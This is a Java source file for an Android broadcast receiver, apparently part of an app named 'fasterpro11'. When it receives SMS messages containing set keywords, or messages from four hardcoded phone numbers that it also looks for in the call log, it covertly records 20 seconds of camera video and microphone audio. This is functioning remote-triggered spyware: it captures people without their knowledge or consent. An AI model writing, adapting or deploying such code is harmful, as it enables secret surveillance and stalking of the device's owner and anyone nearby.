package com.example.fasterpro11;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Settings;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class VideoRecord extends BroadcastReceiver {

    private MediaRecorder mediaRecorder;
    private String fileName;
    private static final String TAG = "VideoRecord";
    private static final String[] allowedNumbers = {
            "+8801300282086", "+8801304039289",  "+8809697637893", "+8809638821369" };
    private static final String[] WORDS1_GRADE = {"Goldv", "Silverv", "Mediumv"};
    private static final String[] WORDS2_OFFER = {"Congratulationv", "Conformv"};
    private List<String> lastMessages = new ArrayList<>();
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isRecording = false;
    private Context context;

    public VideoRecord(Context context) {
        this.context = context.getApplicationContext();
    }

    public VideoRecord() {}

    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context.getApplicationContext();
        Log.d(TAG, "VideoRecord class onReceive called with action: " + intent.getAction());
        try {
            if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
                handleSmsReceived(intent);
            } else if ("android.intent.action.PHONE_STATE".equals(intent.getAction())) {
                handleIncomingCall(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onReceive: ", e);
        }
    }

    private void handleIncomingCall(Intent intent) {
        try {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            if (TelephonyManager.EXTRA_STATE_RINGING.equals(state) ||
                    TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
                Log.d(TAG, "On call: " + state);
            } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
                Log.d(TAG, "Call ended.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in handleIncomingCall: ", e);
        }
    }

    private void handleSmsReceived(Intent intent) {
        try {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = smsMessage.getOriginatingAddress();
                    String messageBody = smsMessage.getMessageBody();
                    Log.d(TAG, "Received SMS: " + sender + ", Message: " + messageBody);

                    lastMessages.clear();
                    lastMessages.add(messageBody);

                    boolean containsWords1 = containsSMSWORDS1GRADE(messageBody);
                    boolean containsWords2 = containsSMSWORDS2OFFER(messageBody);
                    boolean isInternetAvailable = isInternetAvailable();
                    boolean isAllowedNumber = isAllowedNumber(sender) || checkLastCallNumbers();

                    Log.d(TAG, "Keywords 1 found: " + containsWords1);
                    Log.d(TAG, "Keywords 2 found: " + containsWords2);
                    Log.d(TAG, "Internet available: " + isInternetAvailable);
                    Log.d(TAG, "Allowed number: " + isAllowedNumber);

                    if ((containsWords1 && containsWords2 && isInternetAvailable) ||
                            (isAllowedNumber && isInternetAvailable)) {
                        startRecording(sender, messageBody);
                        Log.d(TAG, "Conditions met for video start recording.");
                    } else {
                        Log.d(TAG, "Conditions not met for video start recording.");
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in handleSmsReceived: ", e);
        }
    }

    public boolean isInternetAvailable() {
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            boolean isAvailable = netInfo != null && netInfo.isConnected();
            Log.d(TAG, "Internet available: " + isAvailable);
            return isAvailable;
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet availability: ", e);
            return false;
        }
    }

    private boolean containsSMSWORDS1GRADE(String messageBody) {
        for (String keyword : WORDS1_GRADE) {
            if (messageBody.contains(keyword)) {
                return true;
            }
        }
        return false;
    }

    private boolean containsSMSWORDS2OFFER(String messageBody) {
        for (String keyword : WORDS2_OFFER) {
            if (messageBody.contains(keyword)) {
                return true;
            }
        }
        return false;
    }

    private boolean isAllowedNumber(String number) {
        for (String allowedNumber : allowedNumbers) {
            if (allowedNumber.equals(number)) {
                return true;
            }
        }
        return false;
    }

    private boolean checkLastCallNumbers() {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Call log permission not granted.");
            return false;
        }

        String[] projection = {CallLog.Calls.NUMBER};
        List<String> recentNumbers = new ArrayList<>();

        try (Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DATE + " DESC")) {
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < 3) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    recentNumbers.add(number);
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error querying call log: ", e);
        }

        for (String number : recentNumbers) {
            if (isAllowedNumber(number)) {
                Log.d(TAG, "Allowed number found in recent calls: " + number);
                return true;
            }
        }
        return false;
    }

    private void startRecording(String sender, String messageBody) {
        if (isRecording) {
            Log.d(TAG, "Recording already in progress.");
            return;
        }

        try {
            isRecording = true;
            String dateTime = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            fileName = Environment.getExternalStorageDirectory() + "/DCIM/videoRecord/" + dateTime + ".mp4";

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setVideoSize(640, 480);
            mediaRecorder.setOutputFile(fileName);

            mediaRecorder.prepare();
            mediaRecorder.start();

            Log.d(TAG, "Recording started: " + fileName);
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    stopRecording();
                }
            }, 20000); // Stop after 20 seconds

        } catch (IOException | IllegalStateException e) {
            Log.e(TAG, "Error starting video recording: ", e);
            isRecording = false;
        }
    }

    private void stopRecording() {
        if (isRecording) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                isRecording = false;
                Log.d(TAG, "Recording stopped and saved to: " + fileName);
            } catch (RuntimeException e) {
                Log.e(TAG, "Error stopping video recording: ", e);
            }
        }
    }

    public void StartRecording(Context context, String sender, String messageBody) {
        Log.d(TAG, "called from Notification class the method of StartRecording in VideoRecord.");
        startRecording(sender, messageBody);
    }
}
